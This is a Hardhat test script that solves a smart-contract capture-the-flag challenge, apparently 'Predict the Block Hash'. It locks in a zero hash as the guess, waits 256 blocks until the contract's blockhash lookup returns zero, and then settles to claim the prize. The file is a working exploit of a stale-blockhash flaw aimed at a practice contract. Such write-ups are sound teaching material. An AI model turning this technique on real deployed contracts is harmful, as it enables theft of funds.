import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers"
import { PredictTheBlockHashChallenge } from "../typechain-types"
import { assert, expect } from "chai"
import { ethers, network } from "hardhat"
import { mine } from "@nomicfoundation/hardhat-network-helpers"

describe("Guess blockhash challenge", function () {
    let attacker: SignerWithAddress
    let target: PredictTheBlockHashChallenge
    before(async function () {
        // Setup code here
        let instanceAddress: string =
            "0x2E5C051f71CC95a1223F7312A3F61181264a2124"
        ;[attacker] = await ethers.getSigners()
        target = await ethers.getContractAt(
            "PredictTheBlockHashChallenge",
            instanceAddress,
            attacker
        )
    })

    it("Guesses the blockhash", async function () {
        // Exploit code here
        let tx, blockInitNum, blockFinNum
        tx = await target.lockInGuess(ethers.constants.HashZero, {
            value: ethers.utils.parseEther("1"),
        })
        await tx.wait(1)
        blockInitNum = await ethers.provider.getBlockNumber()
        blockFinNum = blockInitNum + 256

        console.log(`Target block number: ${blockFinNum}`)
        while (true) {
            let currentBlockNum = await ethers.provider.getBlockNumber()
            console.log(
                `Current block: ${await ethers.provider.getBlockNumber()}`
            )
            if (currentBlockNum >= blockFinNum) {
                console.log(`Target block reached!`)
                tx = await target.settle({ gasLimit: 50000 })
                await tx.wait(1)
                console.log(`Settled!`)
                console.log(`Bool: ${await target.isComplete()}`)
                break
            }
            console.log(
                `Target block is ${blockFinNum - currentBlockNum} blocks away`
            )
            console.log(`Waiting...`)
            if (network.name === "hardhat" || network.name === "localhost") {
                await mine(blockFinNum - currentBlockNum + 1)
            } else {
                await new Promise((r) => setTimeout(r, 60000))
            }
        }
    })

    after(async function () {
        // Verification Code here
        assert(await target.isComplete(), "Challenge not completed")
    })
})
